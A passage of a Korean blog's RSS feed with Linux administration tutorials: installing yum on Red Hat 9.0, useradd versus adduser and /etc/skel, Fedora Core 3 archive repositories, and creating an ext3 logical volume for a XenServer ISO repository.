License GPLv3+: GNU GPL version &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; or later &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;http://gnu.org/licenses/gpl.html&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;.
This is &lt;span class=&quot;token function&quot;&gt;free&lt;/span&gt; software: you are &lt;span class=&quot;token function&quot;&gt;free&lt;/span&gt; to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by John Gilmore and Jay Fenlason.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;whereis&lt;/code&gt;명령을 통해 /bin/tar에 존재함을 알 수 있다. 이 파일을 백업용으로 tar_old로 변경하고, 새로운 tar를 복하하여 넣는다.&lt;/p&gt;
&lt;p&gt;version을 확인해보면 정상적으로 적용됨을 알 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Red Hat 9.0 Yum]]></title><description><![CDATA[참고: http://phpschool.com/gnuboard4/bbs/board.php?bo_table=tipntech&wr_id=52360&sca=&sfl=wr_subject&stx=yum&sop=and Red Hat 9.…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 05 Sep 2015 12:00:00 GMT</pubDate><content:encoded>&lt;p&gt;참고: &lt;a href=&quot;http://phpschool.com/gnuboard4/bbs/board.php?bo_table=tipntech&amp;#x26;wr_id=52360&amp;#x26;sca=&amp;#x26;sfl=wr_subject&amp;#x26;stx=yum&amp;#x26;sop=and&quot;&gt;http://phpschool.com/gnuboard4/bbs/board.php?bo_table=tipntech&amp;#x26;wr_id=52360&amp;#x26;sca=&amp;#x26;sfl=wr_subject&amp;#x26;stx=yum&amp;#x26;sop=and&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Red Hat 9.0을 설치하게 되면 기본적으로 Yum이 설치되어 있지 않다. 그래서 직접 설치해 주어야 하는데, &lt;code class=&quot;language-text&quot;&gt;rpm&lt;/code&gt;을 이용하여 설치하도록 하겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# wget ftp://ftp.pbone.net/mirror/ftp.freshrpms.net/pub/freshrpms/pub/dag/redhat/9/en/i386/RPMS.dag/yum-2.0.8-0.1.rh9.rf.noarch.rpm&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# rpm -ivh yum-2.0.8-0.1.rh9.rf.noarch.rpm&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 명령으로 간단히 yum을 설치할 수 있다.&lt;/p&gt;
&lt;p&gt;하지만 오래된 버전인 만큼 yum이 정상적으로 &lt;strong&gt;작동하지 않는다&lt;/strong&gt;. 이를 해결하기 위해서&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;[base]
name=Red Hat Linux 9.0 base
baseurl=http://mirror.hostway.co.kr/redhat/9/os/i386/

[updates]
name=Red Hat Linux 9.0 updates
baseurl=http://mirror.hostway.co.kr/redhat/9/updates/i386/&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; /etc/yum.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 하게되면 정상적으로 작동하게 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[리눅스 사용자 계정 추가]]></title><description><![CDATA[리눅스에서 사용자 계정을 추가하는 명령은 와 명령이 있다. 두 명령의 차이점은 adduser의 경우 모든 설정을 자동으로 할 수 있는 반면, useradd의 경우는 모든 설정을 수동으로 해주어야 한다. 그럼 useradd…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 05 Sep 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;리눅스에서 사용자 계정을 추가하는 명령은 &lt;code class=&quot;language-text&quot;&gt;adduser&lt;/code&gt;와 &lt;code class=&quot;language-text&quot;&gt;useradd&lt;/code&gt;명령이 있다.&lt;/p&gt;
&lt;p&gt;두 명령의 차이점은 adduser의 경우 모든 설정을 &lt;strong&gt;자동&lt;/strong&gt;으로 할 수 있는 반면, useradd의 경우는 모든 설정을 &lt;strong&gt;수동&lt;/strong&gt;으로 해주어야 한다.&lt;/p&gt;
&lt;p&gt;그럼 useradd로 계정을 추가해 보도록 하겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# useradd test2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;계정을 추가할때 &lt;strong&gt;패스워드&lt;/strong&gt;를 설정하지 않는다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ls -al /home/test2&lt;/span&gt;
ls: cannot access /home/test2: No such &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; or directory&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;또한 &lt;strong&gt;계정폴더&lt;/strong&gt;가 생성되지 않는다.&lt;/p&gt;
&lt;p&gt;adduser로 test라는 사용자를 추가하였다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# adduser test&lt;/span&gt;
Adding user &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;test&apos; &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
Adding new group &lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos; (1010) ...
Adding new user `test&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1004&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; with group &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;test&apos; &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
Creating home directory &lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;/home/test&lt;span class=&quot;token string&quot;&gt;&apos; ...
Copying files from `/etc/skel&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
Changing the user information &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;
Enter the new value, or press ENTER &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; the default
    Full Name &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;:
    Room Number &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;:
    Work Phone &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;:
    Home Phone &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;:
    Other &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;:
Is the information correct? &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Y/n&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; y&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;여기서 보아야 할 점은 &lt;code class=&quot;language-text&quot;&gt;Copying files from &apos;/etc/skel&apos; ...&lt;/code&gt; 이다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# cd /etc/skel/&lt;/span&gt;
root@ubuntu:/etc/skel&lt;span class=&quot;token comment&quot;&gt;# ls -al&lt;/span&gt;
total &lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;
drwxr-xr-x  &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; root root &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; May  &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;:14 &lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;
drwxr-xr-x &lt;span class=&quot;token number&quot;&gt;92&lt;/span&gt; root root &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Sep  &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;:58 &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;
-rw-r--r--  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root root  &lt;span class=&quot;token number&quot;&gt;220&lt;/span&gt; Apr  &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2014&lt;/span&gt; .bash_logout
-rw-r--r--  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root root &lt;span class=&quot;token number&quot;&gt;3637&lt;/span&gt; Apr  &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2014&lt;/span&gt; .bashrc
-rw-r--r--  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root root  &lt;span class=&quot;token number&quot;&gt;675&lt;/span&gt; Apr  &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2014&lt;/span&gt; .profile&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;해당 폴더에 가보게 되면 이렇게 기본적인 설정 파일이 있다. 이 파일들을 새로 생성한 계정폴더에 복사하게 되는 것 이다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@ubuntu:~&lt;span class=&quot;token comment&quot;&gt;# ls -al /home/test/&lt;/span&gt;
total &lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;
drwxr-xr-x &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Sep  &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;:58 &lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;
drwxr-x--x &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; root root &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Sep  &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;:58 &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;
-rw-r--r-- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;220&lt;/span&gt; Sep  &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;:58 .bash_logout
-rw-r--r-- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3637&lt;/span&gt; Sep  &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;:58 .bashrc
-rw-r--r-- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;675&lt;/span&gt; Sep  &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;:58 .profile&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 추가된 계정은 자동으로 폴더가 추가되고, 설정파일도 생성되게 된다.&lt;/p&gt;
&lt;p&gt;Ubuntu의 경우에는 &lt;code class=&quot;language-text&quot;&gt;/etc/adduser.conf&lt;/code&gt;가 있고,&lt;/p&gt;
&lt;p&gt;CentOS의 경우 &lt;code class=&quot;language-text&quot;&gt;/etc/default/useradd&lt;/code&gt;가 있다.&lt;/p&gt;
&lt;p&gt;이 파일들을 설정하여 &lt;code class=&quot;language-text&quot;&gt;adduser&lt;/code&gt;를 설정할 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Fedora Core 3 repositories]]></title><description><![CDATA[참고: http://unix.stackexchange.com/questions/10009/are-there-any-repositories-for-fedora-3 Fedora는 약 6개월마다 새로운 버전이 릴리즈되며, 유지보수 기간도…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Thu, 03 Sep 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;참고: &lt;a href=&quot;http://unix.stackexchange.com/questions/10009/are-there-any-repositories-for-fedora-3&quot;&gt;http://unix.stackexchange.com/questions/10009/are-there-any-repositories-for-fedora-3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Fedora는 약 6개월마다 새로운 버전이 릴리즈되며, 유지보수 기간도 1년밖에 되지 않는다. 그래서인지 아주 오래된 FC3(현재 FC22)를 사용하게 되었는데, yum이 작동되지 않는다.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2015-09-03&lt;/strong&gt;일 기준으로 해결법이다.&lt;/p&gt;
&lt;p&gt;Fedora Core 3를 설치하게 되면 기본적으로 baseurl이 &lt;a href=&quot;http://download.fedora.redhat.com/pub/fedora/linux/core/$releasever/$basearch/os/%EB%A1%9C&quot;&gt;http://download.fedora.redhat.com/pub/fedora/linux/core/$releasever/$basearch/os/로&lt;/a&gt; 되어있다.&lt;/p&gt;
&lt;p&gt;yum 설정 repositories에 관한 파일은 &lt;code class=&quot;language-text&quot;&gt;/etc/yum.repos.d/&lt;/code&gt;에 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;baseurl=http://archive.kernel.org/fedora-archive/core/3/i386/os/
baseurl=http://archive.kernel.org/fedora-archive/extras/3/i386/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 두줄을 추가해 주면 된다.&lt;/p&gt;
&lt;p&gt;gpg error가 나는 경우가 있는데,&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# rpm --import /usr/share/rhn/RPM-GPG-KEY&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 명령을 사용하면 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[XenServer Local ISO repository]]></title><description><![CDATA[참고: http://geekcorner.sitedevelopments.net/2013/03/29/create-local-iso-repository-xenserver-6/ 우선 Local ISO repository…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 02 Sep 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;참고: &lt;a href=&quot;http://geekcorner.sitedevelopments.net/2013/03/29/create-local-iso-repository-xenserver-6/&quot;&gt;http://geekcorner.sitedevelopments.net/2013/03/29/create-local-iso-repository-xenserver-6/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;우선 Local ISO repository를 생성하기 전에 사용 가능한 Volume을 확인한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# vgs&lt;/span&gt;
  VG                                                 &lt;span class=&quot;token comment&quot;&gt;#PV #LV #SN Attr   VSize VFree&lt;/span&gt;
  VG_XenStorage-775f9a8c-d8a7-d90b-dd9d-8d0fd69d9dc6   &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; wz--n- &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;.99G &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;.98G
  VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb   &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; wz--n- &lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;.27T &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;.35T&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;현재 7.2T중 6.3T가 사용 가능하므로 이중 1T를 사용하도록 하겠다.&lt;/p&gt;
&lt;p&gt;디스크에서 공간을 할당해 주어야 하는데, 이 명령은 lvcreate를 이용하면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# lvcreate -L 1T -n test VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb&lt;/span&gt;
  Logical volume &lt;span class=&quot;token string&quot;&gt;&quot;test&quot;&lt;/span&gt; created&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이런 식으로 &lt;code class=&quot;language-text&quot;&gt;-L&lt;/code&gt;옵션을 통하여 크기를, &lt;code class=&quot;language-text&quot;&gt;-n&lt;/code&gt;옵션을 통하여 이름을 설정한 뒤, 사용할 Volume을 적게되면 해당하는 Volume에 생성되게 된다.&lt;/p&gt;
&lt;p&gt;lvs을 사용하여 확인을 할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost mnt&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# lvs&lt;/span&gt;
  LV                                       VG                                                 Attr   LSize   Origin Snap%  Move Log Copy%  Convert
  MGT                                      VG_XenStorage-775f9a8c-d8a7-d90b-dd9d-8d0fd69d9dc6 -wi---   &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;.00M
  MGT                                      VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi-a-   &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;.00M
  VHD-120e9fb2-c44c-49e1-b308-7df92730b80c VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi-ao  &lt;span class=&quot;token number&quot;&gt;30&lt;/span&gt;.07G
  VHD-17266391-ce71-46bb-8f24-cf5717711af3 VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi---   &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;.02G
  VHD-306ad48e-5072-4363-82ba-999274a7e616 VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi---  &lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;.05G
  VHD-3eaf8e2b-567e-4f5a-a3ad-514c1478f041 VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi-ao  &lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt;.13G
  VHD-62f887d6-7446-49bb-8bc8-396036ea5d3b VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi---   &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;.02G
  VHD-80b4d2f3-5612-49a2-962d-40403d33fd9c VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi-ao &lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;.26G
  VHD-9f21884f-c8bf-4c1f-9705-d12a342ab154 VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi---  &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;.04G
  VHD-c43fdd45-aace-44aa-a7bf-66629e1eff8c VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi---  &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;.00M
  VHD-ef1e1815-0e9a-45d9-87e3-b392e96e7caa VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi---  &lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;.05G
  VHD-f8684adf-9f72-4fd1-bd37-e9a1d73ee074 VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi-ao &lt;span class=&quot;token number&quot;&gt;513&lt;/span&gt;.01G
  isoImage                                 VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi--- &lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;.00G
  &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;                                     VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb -wi-ao   &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;.00T&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;마지막 줄을 보게되면 해당하는 이름으로 생성된것을 확인할 수 있다. 이제 이를 사용하여야 하는데, 사용하기전 포맷을 하여야 한다.&lt;/p&gt;
&lt;p&gt;ext3타입으로 포맷후 사용할 것이기 때문에 &lt;code class=&quot;language-text&quot;&gt;mkfs.ext3&lt;/code&gt;를 사용하도록 한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# mkfs.ext3 /dev/VG_XenStorage-cd27bd82-61d4-1bb3-e5b6-1a1e9c57c7eb/test&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;mke2fs&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1.39&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt;-May-2006&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
Filesystem &lt;span class=&quot;token assign-left variable&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;
OS type: Linux
Block &lt;span class=&quot;token assign-left variable&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;log&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
Fragment &lt;span class=&quot;token assign-left variable&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;log&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;134217728&lt;/span&gt; inodes, &lt;span class=&quot;token number&quot;&gt;268435456&lt;/span&gt; blocks
&lt;span class=&quot;token number&quot;&gt;13421772&lt;/span&gt; blocks &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5.00&lt;/span&gt;%&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; reserved &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; the super user
First data &lt;span class=&quot;token assign-left variable&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
Maximum filesystem &lt;span class=&quot;token assign-left variable&quot;&gt;blocks&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4294967296&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;8192&lt;/span&gt; block &lt;span class=&quot;token function&quot;&gt;groups&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;32768&lt;/span&gt; blocks per group, &lt;span class=&quot;token number&quot;&gt;32768&lt;/span&gt; fragments per group
&lt;span class=&quot;token number&quot;&gt;16384&lt;/span&gt; inodes per group
Superblock backups stored on blocks:
    &lt;span class=&quot;token number&quot;&gt;32768&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;98304&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;163840&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;229376&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;294912&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;819200&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;884736&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;1605632&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;2654208&lt;/span&gt;,
    &lt;span class=&quot;token number&quot;&gt;4096000&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;7962624&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;11239424&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;20480000&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;23887872&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;71663616&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;78675968&lt;/span&gt;,
    &lt;span class=&quot;token number&quot;&gt;102400000&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;214990848&lt;/span&gt;

Writing inode tables: &lt;span class=&quot;token keyword&quot;&gt;done&lt;/span&gt;
